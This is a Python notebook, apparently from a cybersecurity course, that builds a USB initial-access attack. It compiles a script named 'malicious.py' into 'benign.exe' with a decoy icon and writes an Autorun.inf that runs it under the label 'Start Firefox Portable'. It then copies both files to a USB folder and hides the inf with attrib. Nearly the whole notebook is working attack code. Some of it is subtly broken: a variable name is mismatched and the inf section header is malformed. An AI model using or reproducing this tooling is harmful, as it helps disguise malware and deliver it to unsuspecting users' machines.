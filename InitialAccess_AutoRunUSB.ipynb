{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyObeMap0i4YsE9ZApa6izxE",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/ft10101/Python-For-CyberSecurity/blob/main/InitialAccess_AutoRunUSB.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "pip install PyInstaller"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "xwY3tmnLBtZE",
        "outputId": "2f0e8a4a-5112-4b9d-f4ee-fda23af5b79f"
      },
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Requirement already satisfied: PyInstaller in /usr/local/lib/python3.9/dist-packages (5.9.0)\n",
            "Requirement already satisfied: setuptools>=42.0.0 in /usr/local/lib/python3.9/dist-packages (from PyInstaller) (67.6.1)\n",
            "Requirement already satisfied: altgraph in /usr/local/lib/python3.9/dist-packages (from PyInstaller) (0.17.3)\n",
            "Requirement already satisfied: pyinstaller-hooks-contrib>=2021.4 in /usr/local/lib/python3.9/dist-packages (from PyInstaller) (2023.1)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 9,
      "metadata": {
        "id": "8YxpX456A2o2"
      },
      "outputs": [],
      "source": [
        "import PyInstaller.__main__\n",
        "import shutil\n",
        "import os"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "filename = \"malicious.py\"\n",
        "exename = \"benign.exe\"\n",
        "icon = \"abc.ico\"\n",
        "pwd = os.getcwd() #current working dir\n",
        "usdir = os.path.join(pwd,\"USB\") #defining a directory for hypothetical drive"
      ],
      "metadata": {
        "id": "K1WeNYXBBsP8"
      },
      "execution_count": 12,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "if os.path.isfile(exename): \n",
        "  os.remove(exename) \n",
        "#if executable already exists we should remove it"
      ],
      "metadata": {
        "id": "IMPcMfpACxl-"
      },
      "execution_count": 11,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"Creating EXE\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "fTyYeIRcC-6X",
        "outputId": "8581730e-7aab-4cde-849a-18867dd3d4ae"
      },
      "execution_count": 13,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Creating EXE\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#create executable from python script\n",
        "PyInstaller.__main__.run([\n",
        "    \"malicious.py\",\n",
        "    \"--onefile\",\n",
        "    \"--clean\",\n",
        "    \"--log-level=ERROR\", #only when error occurs \n",
        "    \"--name=\"+exename,\n",
        "    \"--icon=\"+icon\n",
        "])"
      ],
      "metadata": {
        "id": "Q5ywGAfiDubN"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        " print(\"EXE created\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "UQAgtW2JF6vj",
        "outputId": "5c920a32-cf80-46af-a8db-24a4d1df6002"
      },
      "execution_count": 21,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "EXE created\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# clean up after PyInstaller\n",
        "shutil.move(os.path.join(pwd,\"dist\",exename),pwd)\n",
        "shutil.rmtree(\"dist\")\n",
        "shutil.rmtree(\"build\")\n",
        "shutil.rmtree(\"__pycache__\")\n",
        "os.remove(exename+\".spec\")"
      ],
      "metadata": {
        "id": "HmBmIECGFBAj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"Creating Autorun file\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "pP3-v18cG6Nk",
        "outputId": "c0a2166e-988f-44fa-ac63-ae0bff39b28b"
      },
      "execution_count": 24,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Creating Autorun file\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#create Autorun file\n",
        "with open(\"Autorun.inf\",\"w\") as o:\n",
        "  o.write(\"(Autorun\\n\") \n",
        "  o.write(\"Open=\"+exename+\"\\n\") \n",
        "  o.write(\"Action=Start Firefox Portable\\n\")\n",
        "  o.write(\"Label=My USB\\n\")\n",
        "  o.write(\"Icon=\"+exename+\"\\n\")"
      ],
      "metadata": {
        "id": "tPneZuKFHBMr"
      },
      "execution_count": 27,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "print(\"Setting up USB\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "KrHiCaoKIKcr",
        "outputId": "d5c12f30-3819-4116-9a41-100d01fa3e63"
      },
      "execution_count": 28,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Setting up USB\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#move files to USB and set to hidden\n",
        "shutil.move(exename,usbdir)\n",
        "shutil.move(\"Autorun.inf\", usbdir)\n",
        "\n",
        "print(\"Attrib +h \"+os.path.join(usbdir, \"Autorun.inf\"))\n",
        "os.system(\"attrib +h \" +os.path.join(usbdir,\"Autorun.inf\"))\n",
        "#os.system(\"attrib +h \" +os.path.join(usbdir,\"Autorun.inf\"))"
      ],
      "metadata": {
        "id": "GHBG_z6cLxp6"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}